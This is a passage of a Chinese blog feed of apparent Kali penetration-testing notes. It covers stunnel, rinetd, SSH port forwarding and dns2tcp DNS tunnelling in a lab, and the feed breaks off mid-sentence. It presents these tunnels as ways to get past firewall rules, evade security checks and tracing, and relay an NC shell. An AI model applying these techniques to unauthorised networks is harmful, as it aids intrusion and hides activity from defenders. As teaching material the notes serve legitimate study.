language-none"><code class="language-none">第一步：在&#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;路径下执行 vim stunnel4.pid第二步：在stunnel4.pid文件中写入3368进程号（根据给出的进程报错信息填写对应进程号）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="去掉注释"><a href="#去掉注释" class="headerlink" title="去掉注释"></a>去掉注释</h5><blockquote><p>将配置文件中所有注释去掉</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215234656041.png" alt="image-20230215234656041"></p><h5 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h5><blockquote><p>此时就能正常启动stunnel4服务侦听本地443端口</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215234914830.png" alt="image-20230215234914830"></p><h3 id="Stunnel4客户端配置"><a href="#Stunnel4客户端配置" class="headerlink" title="Stunnel4客户端配置"></a>Stunnel4客户端配置</h3><h4 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h4><ul><li><code>vim  /etc/stunnel/stunnel.conf</code></li></ul><pre class="line-numbers language-none"><code class="language-none">client &#x3D; yes                     # 证明自己是client[mysqls]                          # 定义与Server相同的访问资源accept &#x3D; 3306                     # 本地侦听端口connect &#x3D; 192.168.216.181:443     # 隧道另一端访问的Server，要符合防火墙规则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215235401397.png" alt="image-20230215235401397"></p><h4 id="客户端自启动"><a href="#客户端自启动" class="headerlink" title="客户端自启动"></a>客户端自启动</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230216000040180.png" alt="image-20230216000040180"></p><h4 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230216000229417.png" alt="image-20230216000229417"></p><h3 id="连接本地3306端口"><a href="#连接本地3306端口" class="headerlink" title="连接本地3306端口"></a>连接本地3306端口</h3><blockquote><p>本地的3306端口就是隧道入口，通过连接本地3306端口就会通过隧道转发到对应服务器的3306端口</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230216000613156.png" alt="image-20230216000613156"></p><blockquote><p>抓包发现有些数据包是通过TLS协议进行传输，也就是通过隧道进行传输的</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230216000739954.png" alt="image-20230216000739954"></p><blockquote><p>无论查看其中哪一个数据包使用了TLS隧道数据都是经过加密的</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230216000949673.png" alt="image-20230216000949673"></p>]]></content>
      
      
      <categories>
          
          <category> 隧道技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 隧道技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-流量操控</title>
      <link href="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
      <url>/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="流量操控技术"><a href="#流量操控技术" class="headerlink" title="流量操控技术"></a>流量操控技术</h2><blockquote><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li><li>在非受信任的网络中实现安全的数据传输</li></ul></blockquote><h2 id="重定向（Redirection）"><a href="#重定向（Redirection）" class="headerlink" title="重定向（Redirection）"></a>重定向（Redirection）</h2><blockquote><p>客户端向真实服务器发送请求，将其请求的真实IP和Port重定向到攻击者的IP和Port，之后攻击者再将客户端的请求信息发送给真实服务器；服务器回包同样也是经过攻击者后返回给客户端。缺点是<strong>不能提供传输通道的加密安全</strong>。</p></blockquote><h3 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a>Rinetd</h3><blockquote><ul><li>配置文件：<code>/etc/rinetd.conf</code></li><li>应用场景<ul><li>重定向web流量，突破上网限制</li><li>远程桌面重定向</li><li>NC重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul></li></ul></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230211184821270.png" alt="image-20230211184821270"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230211190103978.png" alt="image-20230211190103978"></p><blockquote><p>假设防火墙只允许53端口出站流量，想要请求目标服务器的流量，但会被防火墙拦截；可以在家里安装Rinetd后侦听TCP&#x2F;53端口，只要访问家用电脑TCP&#x2F;53端口就会将请求转发给目标服务器；这样就可以在内网环境中访问家用电脑的TCP&#x2F;53端口重定向到目标主机。</p><p><strong>需要在家用电脑中进行重定向的配置</strong></p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212112137695.png" alt="image-20230212112137695"></p><blockquote><p>配置Rinetd的配置文件，绑定本地IP（侦听），绑定的本地端口根据防火墙允许出口的端口设置</p></blockquote><h2 id="隧道（Tunneling）"><a href="#隧道（Tunneling）" class="headerlink" title="隧道（Tunneling）"></a>隧道（Tunneling）</h2><blockquote><ul><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点（IP2IP）、端到端（Port2Port）隧道</li><li>VPN：PPTP(有些明文传输)、L2TP、IPSec、SSL vpn</li></ul></blockquote><h2 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h2><blockquote><ul><li>SSH支持双向通信隧道<ul><li>将其他 TCP 端口的通信通过 SSH 链接来转发</li><li>用SSH作为传输层协议，对流量自动加解密</li><li>突破防火墙访问规则的限制，可用于翻墙</li></ul></li><li>SSH 端口转发<ul><li>本地端口转发<ul><li>本地侦听端口，访问转发到远程主机指定端口</li><li>SSH流量方向与应用流量方向相同</li><li>若开通隧道的主机和侦听端口的主机是同一主机就是本地端口转发</li></ul></li><li>远程端口转发<ul><li>远程侦听端口，访问转发到本机主机指定端口</li><li>SSH流量方向与应用流量方向相反</li><li>若开通隧道的主机与侦听端口的主机不是同一主机就是远程端口转发</li></ul></li><li>动态隧道模式</li></ul></li></ul></blockquote><h3 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a>SSH 本地端口转发</h3><blockquote><ul><li>使用效果类似于rinetd</li><li>将本地端口与远程服务器建立隧道</li><li>本地侦听端口，访问转发到远程主机指定端口</li><li>SSH客户端 + 应用客户端位于防火墙一端</li><li>SSH服务端 + 应用服务端位于防火墙另一端</li></ul></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/20200519104211754.jpg" alt="20200519104211754"></p><h4 id="配置远程主机SSH文件"><a href="#配置远程主机SSH文件" class="headerlink" title="配置远程主机SSH文件"></a>配置远程主机SSH文件</h4><ul><li><code>vim /etc/ssh/sshd_config</code></li></ul><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212131042792.png" alt="image-20230212131042792"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212131130835.png" alt="image-20230212131130835"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212131750061.png" alt="image-20230212131750061"></p><h4 id="开启服务器web程序"><a href="#开启服务器web程序" class="headerlink" title="开启服务器web程序"></a>开启服务器web程序</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212132502154.png" alt="image-20230212132502154"></p><h4 id="建立隧道连接"><a href="#建立隧道连接" class="headerlink" title="建立隧道连接"></a>建立隧道连接</h4><ul><li><code>ssh -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code></li></ul><blockquote><p>-L：侦听本地端口</p><p>remote ip&#x2F;port：目标应用服务的IP&#x2F;端口</p><p>ssh server&#x2F;port：建立ssh链接的主机&#x2F;端口</p><p>一般默认端口转发使用侦听端口范围：7000+</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212134546339.png" alt="image-20230212134546339"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212134901896.png" alt="image-20230212134901896"></p><blockquote><p>此时只要访问本地7001端口，流量就会流到192.168.216.172的80端口</p></blockquote><h4 id="访问本地7001端口"><a href="#访问本地7001端口" class="headerlink" title="访问本地7001端口"></a>访问本地7001端口</h4><blockquote><p>当进入到目标服务器的web界面，就实现了SSH本地端口转发</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212135223370.png" alt="image-20230212135223370"></p><ul><li><code>ssh -fCN -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code></li></ul><blockquote><p>-f：后台运行进程</p><p>-N：建立连接，不执行登录shell</p><p>-C：连接通信过程进行压缩，节省带宽</p><p>此时连接已经建立，但是在后台运行</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212143249207.png" alt="image-20230212143249207"></p><h3 id="SSH-远端口建立SSH隧道"><a href="#SSH-远端口建立SSH隧道" class="headerlink" title="SSH 远端口建立SSH隧道"></a>SSH 远端口建立SSH隧道</h3><h4 id="利用远程主机Apache服务"><a href="#利用远程主机Apache服务" class="headerlink" title="利用远程主机Apache服务"></a>利用远程主机Apache服务</h4><ul><li><code>ssh -fCN -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code></li></ul><blockquote><p>当远程主机开启Apache服务后，由于本地主机和远程主机建立的SSH隧道连接，可以认为远程主机的80端口开放在本地主机，因此在<code>remote IP</code>字段处可替换为<code>localhost</code></p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212143840158.png" alt="image-20230212143840158"></p><h3 id="SSH隧道远程桌面登录"><a href="#SSH隧道远程桌面登录" class="headerlink" title="SSH隧道远程桌面登录"></a>SSH隧道远程桌面登录</h3><h4 id="开启winXP的远程桌面"><a href="#开启winXP的远程桌面" class="headerlink" title="开启winXP的远程桌面"></a>开启winXP的远程桌面</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212144632176.png" alt="image-20230212144632176"></p><h4 id="建立远程桌面隧道"><a href="#建立远程桌面隧道" class="headerlink" title="建立远程桌面隧道"></a>建立远程桌面隧道</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212145053626.png" alt="image-20230212145053626"></p><h4 id="连接7003端口"><a href="#连接7003端口" class="headerlink" title="连接7003端口"></a>连接7003端口</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212145153137.png" alt="image-20230212145153137"></p><h3 id="复用网关"><a href="#复用网关" class="headerlink" title="复用网关"></a>复用网关</h3><ul><li><code>ssh -fCNg -L &lt;listen port&gt;::&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code></li></ul><blockquote><p>-g：复用访问时作为网关，支持多主机访问本地侦听端口</p></blockquote><h4 id="侦听所有IP"><a href="#侦听所有IP" class="headerlink" title="侦听所有IP"></a>侦听所有IP</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230212150028346.png" alt="image-20230212150028346"></p><blockquote><p>此时只要有一台主机建立隧道，利用<code>-g</code>参数让本机作为网关使多主机访问本地侦听端口，就可以访问其他服务</p></blockquote><h3 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h3><blockquote><p>由于ACL、防火墙规则等原因，SSH与应用建立连接方向相反，此时需要SSH远程端口转发。此时，Transfer运行SSH客户端并侦听端口，通过建立SSH隧道，将LAN主机的访问流量转发到远程主机Server指定端口 <em>(之所以称为远程端口转发，是因为SSH Client和侦听端口不在隧道同一端)</em></p><ul><li>SSH客户端、应用客户端位于防火墙两端</li><li>SSH客户端、应用服务端位于防火墙两端</li></ul></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/2020051910415670.jpg" alt="2020051910415670"></p><h4 id="应用客户端侦听端口"><a href="#应用客户端侦听端口" class="headerlink" title="应用客户端侦听端口"></a>应用客户端侦听端口</h4><ul><li><code>ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</code></li></ul><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213095658018.png" alt="image-20230213095658018"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213095723242.png" alt="image-20230213095723242"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213095821450.png" alt="image-20230213095821450"></p><blockquote><p>此时SSH客户端已经建立SSH隧道连接，但端口是开放在应用客户端（SSH服务端）</p></blockquote><h4 id="查看SSH服务端是否开启侦听"><a href="#查看SSH服务端是否开启侦听" class="headerlink" title="查看SSH服务端是否开启侦听"></a>查看SSH服务端是否开启侦听</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213100007451.png" alt="image-20230213100007451"></p><h4 id="在SSH服务端访问服务"><a href="#在SSH服务端访问服务" class="headerlink" title="在SSH服务端访问服务"></a>在SSH服务端访问服务</h4><blockquote><p>其中只有SSH隧道之间通信是加密的，因此除SSH隧道之外其他通信都是未加密的，可嗅探。</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213100737963.png" alt="image-20230213100737963"></p><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a>SSH 动态端口转发</h3><blockquote><ul><li><p>本地、远程端口转发都需要固定应用服务器IP、Port</p><ul><li>应用端口繁多，逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul></li><li><p>本地侦听socks4&#x2F;5代理端口</p><ul><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理（浏览器）</li><li>使用አ proxychains支持无代理客户端</li><li><code>ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</code></li></ul></li></ul></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/20200519104106112.jpg" alt="20200519104106112"></p><h4 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213104039252.png" alt="image-20230213104039252"></p><h4 id="配置客户端代理"><a href="#配置客户端代理" class="headerlink" title="配置客户端代理"></a>配置客户端代理</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213104338129.png" alt="image-20230213104338129"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213104643900.png" alt="image-20230213104643900"></p><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a>X 协议转发</h3><blockquote><ul><li>远程登录Linux GUI运行图形化界面工具<ul><li>VNC</li><li>X Windows</li></ul></li><li>防火墙限制访问时<ul><li>基于SSH的X转发</li><li><code>ssh -X user@1.1.1.1 -p 53</code></li></ul></li></ul></blockquote><h4 id="建立隧道连接-1"><a href="#建立隧道连接-1" class="headerlink" title="建立隧道连接"></a>建立隧道连接</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213105608643.png" alt="image-20230213105608643"></p><h4 id="启动图形化工具"><a href="#启动图形化工具" class="headerlink" title="启动图形化工具"></a>启动图形化工具</h4><blockquote><p>在本地运行X协议，但是启动的图形化工具只是映射到本地的结果，运行的进程是在连接服务端</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213105853845.png" alt="image-20230213105853845"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213110001380.png" alt="image-20230213110001380"></p><h2 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h2><blockquote><ul><li>防火墙禁止TCP出站访问流量<ul><li>SSH隧道、端口转发全部失效</li><li>使用基于UDP协议的隧道</li><li>DNS的工作原理适合用于实现隧道</li></ul></li><li>DNS隧道<ul><li>DNS协议工作在TCP&#x2F;UDP 53端口，<strong>UDP端口用于DNS解析请求，TCP端口用于同一个域下DNS服务器数据同步</strong>，一般小型局域网都会使用公网DNS服务器作为本地DNS服务器，所以如果防火墙限制严格，完全可以禁止TCP流量出站，此时基于TCP端口的隧道失效（如SSH隧道），需要搭建基于UDP的隧道。一般防火墙至少会开放UDP 53端口，可以利用DNS协议的工作原理实现UDP隧道</li></ul></li><li>DNS隧道原理<ul><li><strong>注册受自己控制的DNS记录</strong></li><li>DNS隧道实现的前提是<strong>指派受自己控制的三级域名服务器</strong> <em>（利用域名服务商提供的域名服务器管理界面，管理所申请域名的主机记录，同时也可以指派下一级子域的域名服务器）</em>。</li></ul></li></ul></blockquote><p>图中<strong>黄色箭头代表指派关系，即本级域名服务器由上一级域名服务器委派</strong>。</p><p>当最终的域名服务器解析完整的域名后，返回给内网主机域名所对应的IP，再根据IP发送请求包。</p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/20200520201922247.jpg" alt="20200520201922247"></p><h3 id="实验拓扑-1"><a href="#实验拓扑-1" class="headerlink" title="实验拓扑 1"></a>实验拓扑 1</h3><blockquote><p>DNS Server既模拟缓存服务器，也模拟授权服务器，在此服务器上面做一个域的委派，委派子域的DNS服务器，委派的目标IP指向Ubuntu。</p><p>Win 2008：安装DNS服务；配置转发器；创建区域lab.com；指派二级域test.lab.com，NS记录指向Ubuntu</p><p>防火墙：只允许出站UDP 53端口流量</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213230227810.png" alt="image-20230213230227810"></p><h4 id="安装DNS服务"><a href="#安装DNS服务" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h4><h5 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h5><blockquote><p>由于要伪装成域名服务器，DNS服务器IP设置为127.0.0.1</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213232541323.png" alt="image-20230213232541323"></p><h5 id="安装DNS服务-1"><a href="#安装DNS服务-1" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213232803674.png" alt="image-20230213232803674"></p><h5 id="创建区域"><a href="#创建区域" class="headerlink" title="创建区域"></a>创建区域</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213232948174.png" alt="image-20230213232948174"></p><h5 id="新建主机记录"><a href="#新建主机记录" class="headerlink" title="新建主机记录"></a>新建主机记录</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213233450135.png" alt="image-20230213233450135"></p><h5 id="委派二级域"><a href="#委派二级域" class="headerlink" title="委派二级域"></a>委派二级域</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213233110275.png" alt="image-20230213233110275"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213233551452.png" alt="image-20230213233551452"></p><h5 id="NS记录指向Ubuntu"><a href="#NS记录指向Ubuntu" class="headerlink" title="NS记录指向Ubuntu"></a>NS记录指向Ubuntu</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213234033175.png" alt="image-20230213234033175"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213234110666.png" alt="image-20230213234110666"></p><h5 id="配置转发器"><a href="#配置转发器" class="headerlink" title="配置转发器"></a>配置转发器</h5><blockquote><p>凡是Win server 2008这台DNS服务器不知道怎么解析，利用转发器去问别人</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230213234505623.png" alt="image-20230213234505623"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214000108664.png" alt="image-20230214000108664"></p><blockquote><p>一般转发器的IP是公网DNS服务器IP地址，这样的话就可以解析本地服务器不能解析的域名，本地解析不了，就会利用转发器转发给公网DNS服务器，由公网DNS去解析，例如：<a href="http://www.baidu.com等/">www.baidu.com等</a></p></blockquote><h4 id="配置客户端DNS-IP指向受控DNS-Server"><a href="#配置客户端DNS-IP指向受控DNS-Server" class="headerlink" title="配置客户端DNS-IP指向受控DNS Server"></a>配置客户端DNS-IP指向受控DNS Server</h4><blockquote><p>配置好受控DNS IP后，解析也一切正常</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214001326150.png" alt="image-20230214001326150"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214001712784.png" alt="image-20230214001712784"></p><h3 id="Dns2tcp"><a href="#Dns2tcp" class="headerlink" title="Dns2tcp"></a>Dns2tcp</h3><blockquote><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C&#x2F;S（dns2tcpc &#x2F; dns2tcpd）架构</li><li>通过TXT记录加密传输数据（A记录长度有限）</li><li>隧道建立后保持连接</li><li>默认记录生存时间TTL值为 3 秒</li><li><strong>利用DNS迭代查询找到受自己控制的DNS服务器，再利用缓存服务器转发客户端具体的查询请求到受控DNS服务器来建立连接</strong></li></ul></blockquote><h4 id="dns2tcpd"><a href="#dns2tcpd" class="headerlink" title="dns2tcpd"></a>dns2tcpd</h4><blockquote><ul><li>服务端配置文件<ul><li>&#x2F;etc&#x2F;dns2tcpd.conf</li><li><code>.dns2tcprcd</code><ul><li>在当前用户的主目录下，创建<code>.dns2tcprcd</code>文件，将所有配置文件内容写入其中，就不需要手动写执行命令</li></ul></li><li>资源可以是其他地址</li></ul></li></ul></blockquote><h5 id="配置dns2tcpd文件"><a href="#配置dns2tcpd文件" class="headerlink" title="配置dns2tcpd文件"></a>配置dns2tcpd文件</h5><blockquote><p>客户端与服务端建立隧道之后，基于隧道，服务端给客户端提供什么资源；若客户端连接ssh服务，就会连接到服务端的22端口&#x2F;25端口；这些端口并不是由dns2tcpd打开侦听，而是客户端连接对应端口后，dns3tcpd转发到服务端真实端口上；例如：客户端开启一个侦听端口2222，然后客户端使用ssh去连接2222端口，此时就会通过隧道发到服务端的53端口（隧道出口），之后dns2tcpd提供的资源就会转发到服务端的22端口，至于22端口是哪一个程序在侦听由服务端决定，也就是说：客户端访问ssh（资源）就会被转发到服务端的22端口</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214013520426.png" alt="image-20230214013520426"></p><h5 id="配置ssh服务"><a href="#配置ssh服务" class="headerlink" title="配置ssh服务"></a>配置ssh服务</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214010800716.png" alt="image-20230214010800716"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214010812086.png" alt="image-20230214010812086"></p><h5 id="启动dns2tcpd"><a href="#启动dns2tcpd" class="headerlink" title="启动dns2tcpd"></a>启动dns2tcpd</h5><ul><li><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></li></ul><blockquote><p>-F：前端运行</p><p>-d：debug level 1-3</p><p>-f：配置文件路径</p></blockquote><p><strong>注意：若在启动dns3tcpd时出现<code>socket.c:107 bind 